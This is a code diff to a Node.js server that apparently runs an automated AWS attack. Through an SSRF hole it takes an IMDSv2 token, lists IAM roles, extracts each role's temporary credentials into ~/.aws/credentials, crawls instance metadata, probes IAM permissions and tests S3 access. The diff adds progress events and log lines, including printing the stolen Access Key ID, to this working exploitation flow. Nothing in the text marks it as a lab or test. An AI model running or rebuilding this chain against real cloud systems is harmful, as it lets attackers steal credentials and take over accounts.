@@ -170,6 +170,7 @@ app.post('/api/start', async (req, res) => {
     io.emit('sessionUpdate', { proxyUrl });
 
     // Step 1: Test SSRF
+    io.emit('progress', { currentStep: 1, totalSteps: 7, stepName: 'Testing SSRF vulnerability' });
     emitLog('info', 'Step 1: Testing SSRF vulnerability...');
     const testUrl = `${CONFIG.imdsv2.baseUrl}/latest/meta-data/`;
     const fullTestUrl = `${proxyUrl}${proxyUrl.includes('?') ? '' : '?'}${CONFIG.ssrf.paramName}=${encodeURIComponent(testUrl)}`;
@@ -196,6 +197,7 @@ app.post('/api/start', async (req, res) => {
     }
 
     // Step 2: Extract IMDSv2 Token
+    io.emit('progress', { currentStep: 2, totalSteps: 7, stepName: 'Extracting IMDSv2 token' });
     emitLog('info', 'Step 2: Extracting IMDSv2 token...');
     emitLog('info', 'Sending PUT request to token endpoint...');
     const token = await imds.fetchIMDSv2Token(proxyUrl);
@@ -216,6 +218,7 @@ app.post('/api/start', async (req, res) => {
     io.emit('sessionUpdate', { imdsToken: token });
 
     // Step 3: Enumerate IAM Roles
+    io.emit('progress', { currentStep: 3, totalSteps: 7, stepName: 'Enumerating IAM roles' });
     emitLog('info', 'Step 3: Enumerating IAM roles...');
     emitLog('info', 'Querying /latest/meta-data/iam/security-credentials endpoint...');
     const roles = await imds.fetchAllIAMRoles(proxyUrl, token);
@@ -229,6 +232,7 @@ app.post('/api/start', async (req, res) => {
     }
 
     // Step 4: Extract credentials for each role
+    io.emit('progress', { currentStep: 4, totalSteps: 7, stepName: 'Extracting credentials' });
     emitLog('info', 'Step 4: Extracting credentials for all roles...');
     for (const role of roles) {
       emitLog('info', `Processing role: ${role}`);
@@ -266,13 +270,16 @@ app.post('/api/start', async (req, res) => {
 
         // Write credentials to file
         emitLog('info', 'Writing credentials to ~/.aws/credentials...');
+        emitLog('info', `Profile name: ${role}`);
+        emitLog('info', `Access Key ID: ${creds.AccessKeyId}`);
+        emitLog('info', `Session token length: ${creds.Token.length} characters`);
         await imds.writeAWSCredentials(
           creds.AccessKeyId,
           creds.SecretAccessKey,
           creds.Token,
           CONFIG.aws.defaultRegion
         );
-        emitLog('info', 'Credentials written successfully');
+        emitLog('success', '✓ Credentials written successfully to ~/.aws/credentials');
 
         // Validate credentials
         emitLog('info', 'Validating credentials with AWS STS...');
@@ -304,6 +311,7 @@ app.post('/api/start', async (req, res) => {
     }
 
     // Step 5: Enumerate IMDS metadata
+    io.emit('progress', { currentStep: 5, totalSteps: 7, stepName: 'Enumerating IMDS metadata' });
     emitLog('info', 'Step 5: Enumerating IMDS metadata...');
     emitLog('info', 'Recursively crawling /latest/meta-data endpoint...');
     emitLog('info', 'Building metadata tree structure for better visualization...');
@@ -338,15 +346,20 @@ app.post('/api/start', async (req, res) => {
     currentSession.summary.setIMDS({ token, totalMetadata: metadataCount });
 
     // Step 6: Enumerate permissions
+    io.emit('progress', { currentStep: 6, totalSteps: 7, stepName: 'Enumerating IAM permissions' });
     emitLog('info', 'Step 6: Enumerating IAM permissions...');
     emitLog('info', 'Testing common AWS API calls to discover granted permissions...');
+    emitLog('info', 'Testing permissions for: EC2, S3, IAM, Lambda, Secrets Manager, SSM, and more...');
     const permResults = await permissions.discoverPermissionsByTesting();
     currentSession.permissions = permResults;
     emitLog('success', `✓ Discovered ${permResults.totalPermissions} permissions`);
     emitLog('info', `Permissions by service: ${Object.keys(permResults.permissionsByService).length} services`);
+    emitLog('info', `All permissions: ${permResults.allPermissions.slice(0, 10).join(', ')}${permResults.allPermissions.length > 10 ? '...' : ''}`);
     if (permResults.dangerousPermissionsList && permResults.dangerousPermissionsList.length > 0) {
       emitLog('warning', `⚠ Found ${permResults.dangerousPermissionsList.length} dangerous permissions`);
       emitLog('info', `Dangerous permissions: ${permResults.dangerousPermissionsList.join(', ')}`);
+    } else {
+      emitLog('info', 'No dangerous permissions detected');
     }
     currentSession.summary.setPermissions({
       total: permResults.totalPermissions,
@@ -364,6 +377,7 @@ app.post('/api/start', async (req, res) => {
     });
 
     // Step 7: Test S3 access
+    io.emit('progress', { currentStep: 7, totalSteps: 7, stepName: 'Testing S3 access' });
     emitLog('info', 'Step 7: Testing S3 access...');
     emitLog('info', 'Running: aws s3api list-buckets');
     emitLog('info', 'Checking for s3:ListAllMyBuckets permission...');
@@ -390,10 +404,12 @@ app.post('/api/start', async (req, res) => {
 
     emitLog('success', '✓ Exploitation complete! All steps finished successfully.');
     emitLog('info', 'You can now use the action buttons to explore AWS resources.');
+    io.emit('progress', { isComplete: true });
     io.emit('exploitationComplete');
   } catch (error) {
     emitLog('error', `✗ Exploitation failed: ${error.message}`);
     emitLog('info', `Error stack: ${error.stack || 'No stack trace available'}`);
+    io.emit('progress', { isComplete: true });
     io.emit('exploitationComplete');
   }
 });
